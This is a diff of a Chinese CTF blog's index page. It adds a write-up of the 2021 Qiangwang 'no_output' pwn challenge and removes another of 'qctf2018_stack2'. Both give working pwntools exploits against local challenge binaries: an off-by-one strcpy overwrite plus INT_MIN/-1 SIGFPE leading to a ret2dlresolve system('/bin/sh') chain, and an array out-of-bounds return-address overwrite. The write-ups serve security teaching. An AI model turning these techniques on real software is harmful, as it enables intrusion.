@@ -155,6 +155,104 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/" class="post-title-link" itemprop="url">2021强网-no_output</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-08 02:11:22 / 修改时间：17:56:12" itemprop="dateCreated datePublished" datetime="2022-03-08T02:11:22+08:00">2022-03-08</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h5 id="Off-By-One（栈）"><a href="#Off-By-One（栈）" class="headerlink" title="Off-By-One（栈）"></a>Off-By-One（栈）</h5><p>源字符串长度等于目标缓冲区长度时，将源字符串复制到目标缓冲区可能会导致off by one（1字节溢出）</p>
+<p>比如strcpy函数在复制字符串时会拷贝结束符<code>\x00</code>，所以会发生如上所述的1字节溢出，将缓冲区的高一位覆盖成<code>\x00</code>。同样如下例子：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为strlen函数在计算字符串长度时并不计算结束符，所以strcpy函数对结束符的拷贝使得在chunk1处发生了1字节溢出</p>
+<h5 id="SIGFPE信号"><a href="#SIGFPE信号" class="headerlink" title="SIGFPE信号"></a>SIGFPE信号</h5><p>“错误的算术操作”会使得SIGFPE信号被发送给进程，例如：整数除零、整数上溢、浮点除零、浮点上/下溢……</p>
+<blockquote>
+<p>一个通常的疏忽是认为除以零是SIGFPE的唯一来源。在一些架构上（包括IA-32[来源请求]），使用INT_MIN（最小的可以被表示的负整数值）除以-1的整数除法也会触发这个信号，因为商是一个无法被表示的正数。（比如8位有符号整数可以表示-128、+127和它们之间的整数。-128÷-1=+128 &gt; +127，因此无法被表示而产生溢出并触发此信号）</p>
+</blockquote>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>保护</p>
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/checksec.jpg" class>
+
+<p>main函数</p>
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/main.png" class>
+
+<p>跟进</p>
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/sub_8049424.jpg" class>
+
+<p>第一个函数中除了setbuf还open了远程的real_flag.txt，将返回的文件描述符放到了 .bss 段上</p>
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/sub_804930B.jpg" class>
+
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/fd.jpg" class>
+
+<p>sub_80493EC()函数没什么太大作用，跳过</p>
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/cmp_func.png" class>
+
+<p>接下来read函数从打开的real_flag.txt文件中读取10个字节并与 .data 段的字符串进行比较</p>
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/data.png" class>
+
+<p>相等则进入sub_8049269()函数。</p>
+<p>因为文件描述符fd跟dest相邻，且dest刚好只有 0x20 个字节，我们这里可以在第二次输入中发送 0x20 个字节给src，这样strcpy函数进行拷贝时就会将fd覆盖成’\x00’，实现控制第三次输入的内容，从而进入到sub_8049269()函数。（要注意第一次输入时buf[]的第一个字节必须是’\x00’，否则strcpy函数在复制src[]字符串时会将buf[]中的字符串也复制进去，导致fd被覆盖成其他值）</p>
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/sub_8049269.jpg" class>
+
+<img src="/2022/03/08/2021%E5%BC%BA%E7%BD%91-no-output/sub_8049236.jpg" class>
+
+<p>这个函数很简单，两次输入后如果触发了if中的算术异常，则给一个栈溢出，因为要进入if中，所以v1肯定不是0，所以选择触发整数上溢异常，用 INT_MIN/-1 即可，也就是 (-2147483648)/(-1)</p>
+<p>进入栈溢出函数后利用ret2dlresolve即可，这里学习一下用pwntools生成ret2dlresolve的payload</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;hello_boy&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-2147483648&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol = <span class="string">&#x27;system&#x27;</span>,args = [<span class="string">&#x27;/bin/sh&#x27;</span>])</span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">info(rop.dump())</span><br><span class="line"></span><br><span class="line">p.sendline(flat(&#123;<span class="number">0x4c</span>:rop.chain(),<span class="number">0x100</span>:dlresolve.payload&#125;))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/27/2021%E6%9A%97%E6%B3%89-reallNeedGoodLuck/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1107,104 +1205,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/18/qctf2018-stack2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/18/qctf2018-stack2/" class="post-title-link" itemprop="url">qctf2018_stack2</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-01-18 15:10:13" itemprop="dateCreated datePublished" datetime="2022-01-18T15:10:13+08:00">2022-01-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-22 02:31:08" itemprop="dateModified" datetime="2022-02-22T02:31:08+08:00">2022-02-22</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>数组越界、找返回地址</p>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下：</p>
-<img src="/2022/01/18/qctf2018-stack2/checksec.jpg" class>
-
-<p>程序主逻辑如下：</p>
-<img src="/2022/01/18/qctf2018-stack2/main-1.jpg" class>
-
-<img src="/2022/01/18/qctf2018-stack2/main-2.jpg" class>
-
-<img src="/2022/01/18/qctf2018-stack2/main-3.jpg" class>
-
-<p>简单分析可知问题出在这</p>
-<img src="/2022/01/18/qctf2018-stack2/%E5%88%86%E6%9E%90-1.jpg" class>
-
-<p>因为没对输入做限制，所以这里存在数组越界漏洞，且程序本身已给后门函数</p>
-<img src="/2022/01/18/qctf2018-stack2/backdoor.jpg" class>
-
-<p>那么我们只需要利用数组越界将 <code>main()</code> 函数返回地址改成后门函数地址即可，我们观察<code>main()</code>函数的栈空间可知数组<code>v13</code>与<code>ebp</code>相差<code>0x70</code>个字节</p>
-<img src="/2022/01/18/qctf2018-stack2/stack.jpg" class>
-
-<p>正常情况下<code>main()</code>函数被调用后<code>main()</code>函数随即创建其栈帧，所以返回地址一般在<code>ebp + 4</code>处，但是我们观察<code>main()</code>函数开头的汇编指令可知<code>main()</code>函数在创建其栈帧前还多了几步操作，这使得返回地址离ebp的距离有所不同</p>
-
-
-<p>上图汇编使得esp先减少了其最低4位的位置，然后压栈的操作使esp再-4，我们知道ASLR对栈的地址随机化是对低4位对齐，所以不会影响到其最低4位，那么我们只需要在<code>main()</code>函数入口打个断点，查看esp的初始位置的最低4位，即可算出返回地址相对于ebp的距离</p>
-<img src="/2022/01/18/qctf2018-stack2/%E5%88%86%E6%9E%90-3.jpg" class>
-
-<p>可以看到esp的最低4位是c，所以最后ebp相对于返回地址的距离为<code>0xc + 0x4 + 0x4 = 0x14</code>个字节，故数组v13相对与返回地址的距离为<code>0x14 + 0x70 = 0x84</code>个字节。</p>
-<p>其实也可以不必这么繁琐的计算，只要让程序跑到将ebp压栈完之后，再查看返回地址与ebp的偏移即可</p>
-<img src="/2022/01/18/qctf2018-stack2/%E5%88%86%E6%9E%90-4.jpg" class>
-
-<p>最后只需要修改返回地址即可，v13为char类型数组，所以我们一次修改一个字节，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line">backdoor = <span class="number">0x0804859B</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;have:\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;numbers\n&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">	p.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x84</span>,<span class="number">0x9B</span>)</span><br><span class="line">write(<span class="number">0x85</span>,<span class="number">0x85</span>)</span><br><span class="line">write(<span class="number">0x86</span>,<span class="number">0x04</span>)</span><br><span class="line">write(<span class="number">0x87</span>,<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>另外本题的远程因为出题人没将dash配置到环境中，所以我们无法直接调用 <code>/bin/dash</code> ，但是问题不大，因为程序本身调用了<code>system()</code> 函数，且有 <code>sh</code> 字符串，所以我们将返回地址修改到 <code>call _system</code> 处，再将 <code>sh</code>作为其参数即可</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1274,14 +1274,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">28</span>
+        <span class="site-state-item-count">29</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
